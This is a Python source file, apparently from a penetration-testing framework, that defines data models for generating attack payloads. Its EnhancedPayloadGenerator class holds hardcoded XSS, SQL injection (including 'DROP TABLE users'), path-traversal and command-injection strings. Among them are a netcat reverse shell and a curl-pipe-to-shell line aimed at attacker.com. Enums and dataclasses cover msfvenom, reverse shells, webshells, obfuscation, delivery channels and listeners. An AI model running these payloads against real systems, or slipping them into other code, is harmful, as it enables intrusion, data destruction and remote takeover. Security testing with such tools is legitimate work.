"""
Payload Generator 數據模型

定義所有 Payload 生成相關的枚舉和類型
"""

from enum import Enum
from typing import Optional, Dict, Any, List
from dataclasses import dataclass
from datetime import datetime

from services.aiva_common.enums import VulnerabilityType, Severity, Confidence
from services.aiva_common.utils.logging import get_logger

logger = get_logger(__name__)


class EnhancedPayloadGenerator:
    """增強型載荷生成器"""
    
    def __init__(self):
        self.payload_templates = {
            'xss': [
                '<script>alert("XSS")</script>',
                '""<script>alert(String.fromCharCode(88,83,83))</script>',
                "'><script>alert('XSS')</script>",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ],
            'sqli': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT null,null,null--",
                "1' AND SLEEP(5)--",
                "' OR 1=1 LIMIT 1--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '/proc/self/environ',
                'php://filter/read=convert.base64-encode/resource=index.php'
            ],
            'rce': [
                '$(whoami)',
                '`id`',
                '; cat /etc/passwd',
                '| nc -e /bin/sh attacker.com 4444',
                '&& curl http://attacker.com/shell.sh | sh'
            ]
        }
    
    async def generate_payload(self, payload_type: str, target_context: str = 'web') -> Dict[str, Any]:
        """生成特定類型的載荷"""
        try:
            logger.info(f"生成載荷: {payload_type} for {target_context}")
            
            if payload_type.lower() not in self.payload_templates:
                return {
                    'error': f'Unsupported payload type: {payload_type}',
                    'status': 'failed'
                }
            
            base_payloads = self.payload_templates[payload_type.lower()]
            generated_payloads = []
            
            # 基礎載荷
            for payload in base_payloads:
                generated_payloads.append({
                    'payload': payload,
                    'encoding': 'none',
                    'context': target_context,
                    'risk_level': 'medium'
                })
            
            # URL編碼載荷
            import urllib.parse
            for payload in base_payloads:
                encoded_payload = urllib.parse.quote(payload)
                generated_payloads.append({
                    'payload': encoded_payload,
                    'encoding': 'url',
                    'context': target_context,
                    'risk_level': 'medium'
                })
            
            return {
                'payload_type': payload_type,
                'target_context': target_context,
                'payloads_generated': len(generated_payloads),
                'payloads': generated_payloads,
                'generation_time': datetime.now(),
                'status': 'completed'
            }
            
        except Exception as e:
            logger.error(f"載荷生成失敗: {e}")
            return {'error': str(e), 'status': 'failed'}


class PayloadType(str, Enum):
    """Payload 類型"""

    MSFVENOM = "msfvenom"
    REVERSE_SHELL = "reverse_shell"
    WEBSHELL = "webshell"
    POC = "poc"
    BIND_SHELL = "bind_shell"
    STAGED = "staged"
    STAGELESS = "stageless"


class PayloadPlatform(str, Enum):
    """目標平台"""

    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    WEB = "web"
    MULTI = "multi"


class PayloadFormat(str, Enum):
    """輸出格式"""

    # Binary Formats
    EXE = "exe"
    DLL = "dll"
    ELF = "elf"
    MACHO = "macho"
    APK = "apk"
    MSI = "msi"

    # Script Formats
    PYTHON = "py"
    BASH = "sh"
    POWERSHELL = "ps1"
    PHP = "php"
    RUBY = "rb"
    PERL = "pl"
    JAVA = "jar"

    # Web Formats
    ASPX = "aspx"
    JSP = "jsp"

    # Other
    RAW = "raw"
    C = "c"
    HEX = "hex"
    BASE64 = "base64"


class ReverseShellLanguage(str, Enum):
    """Reverse Shell 支援語言"""

    BASH = "bash"
    PYTHON = "python"
    POWERSHELL = "powershell"
    PHP = "php"
    RUBY = "ruby"
    PERL = "perl"
    JAVA = "java"
    C = "c"
    NETCAT = "netcat"
    SOCAT = "socat"


class WebShellType(str, Enum):
    """Web Shell 類型"""

    PHP_SIMPLE = "php_simple"
    PHP_ADVANCED = "php_advanced"
    ASPX = "aspx"
    JSP = "jsp"
    PYTHON_FLASK = "python_flask"
    PYTHON_DJANGO = "python_django"


class PoCType(str, Enum):
    """PoC 類型"""

    RCE = "rce"
    SQLI = "sqli"
    XSS = "xss"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    IDOR = "idor"


class ObfuscationMethod(str, Enum):
    """混淆方法"""

    BASE64 = "base64"
    HEX = "hex"
    ROT13 = "rot13"
    XOR = "xor"
    POLYMORPHIC = "polymorphic"
    CUSTOM = "custom"
    NONE = "none"


class DeliveryMethod(str, Enum):
    """交付方式"""

    HTTP = "http"
    HTTPS = "https"
    FTP = "ftp"
    SMB = "smb"
    DNS = "dns"
    EMAIL = "email"
    USB = "usb"


class ListenerType(str, Enum):
    """監聽器類型"""

    TCP = "tcp"
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    SMB = "smb"


@dataclass
class PayloadConfig:
    """Payload 配置"""

    payload_type: PayloadType
    platform: PayloadPlatform
    format: PayloadFormat

    # Network Config
    lhost: str
    lport: int
    rhost: Optional[str] = None
    rport: Optional[int] = None

    # Encoding/Obfuscation
    encoder: Optional[str] = None
    iterations: int = 1
    obfuscation: ObfuscationMethod = ObfuscationMethod.NONE

    # MSFVenom Specific
    msfvenom_payload: Optional[str] = None
    bad_chars: Optional[str] = None
    nopsled: int = 0

    # Reverse Shell Specific
    shell_language: Optional[ReverseShellLanguage] = None

    # WebShell Specific
    webshell_type: Optional[WebShellType] = None
    password: Optional[str] = None

    # PoC Specific
    poc_type: Optional[PoCType] = None
    target_url: Optional[str] = None
    cve_id: Optional[str] = None
    parameters: Optional[Dict[str, Any]] = None

    # Delivery
    delivery_method: DeliveryMethod = DeliveryMethod.HTTP
    listener_type: ListenerType = ListenerType.TCP

    # Authorization
    authorization_token: Optional[str] = None
    risk_level: str = "L2"

    # Additional Options
    custom_template: Optional[str] = None
    additional_options: Optional[Dict[str, Any]] = None


@dataclass
class PayloadResult:
    """Payload 生成結果"""

    success: bool
    payload: Optional[str]
    payload_type: PayloadType
    platform: PayloadPlatform
    format: PayloadFormat

    # Metadata
    size_bytes: Optional[int] = None
    md5_hash: Optional[str] = None
    sha256_hash: Optional[str] = None

    # Delivery Info
    delivery_url: Optional[str] = None
    delivery_method: Optional[DeliveryMethod] = None
    listener_info: Optional[Dict[str, Any]] = None

    # Generation Info
    generated_at: datetime = None
    execution_time: float = 0.0

    # Obfuscation Info
    is_obfuscated: bool = False
    obfuscation_methods: List[str] = None

    # Error Info
    error_message: Optional[str] = None
    error_details: Optional[Dict[str, Any]] = None

    # Authorization Info
    authorized: bool = False
    authorization_level: Optional[str] = None

    def __post_init__(self):
        if self.generated_at is None:
            self.generated_at = datetime.now()
        if self.obfuscation_methods is None:
            self.obfuscation_methods = []


@dataclass
class ListenerConfig:
    """監聽器配置"""

    listener_type: ListenerType
    lhost: str
    lport: int

    # SSL/TLS
    use_ssl: bool = False
    cert_path: Optional[str] = None
    key_path: Optional[str] = None

    # Authentication
    password: Optional[str] = None
    require_auth: bool = False

    # Logging
    log_connections: bool = True
    log_data: bool = False

    # Additional Options
    custom_options: Optional[Dict[str, Any]] = None


@dataclass
class DeliveryConfig:
    """交付配置"""

    delivery_method: DeliveryMethod
    payload_path: str

    # HTTP/HTTPS
    http_host: Optional[str] = None
    http_port: Optional[int] = None
    use_https: bool = False

    # FTP
    ftp_host: Optional[str] = None
    ftp_port: Optional[int] = 21
    ftp_user: Optional[str] = None
    ftp_pass: Optional[str] = None

    # Tracking
    track_downloads: bool = True
    track_ips: bool = True

    # Security
    require_auth: bool = False
    allowed_ips: Optional[List[str]] = None

    # Additional Options
    custom_options: Optional[Dict[str, Any]] = None
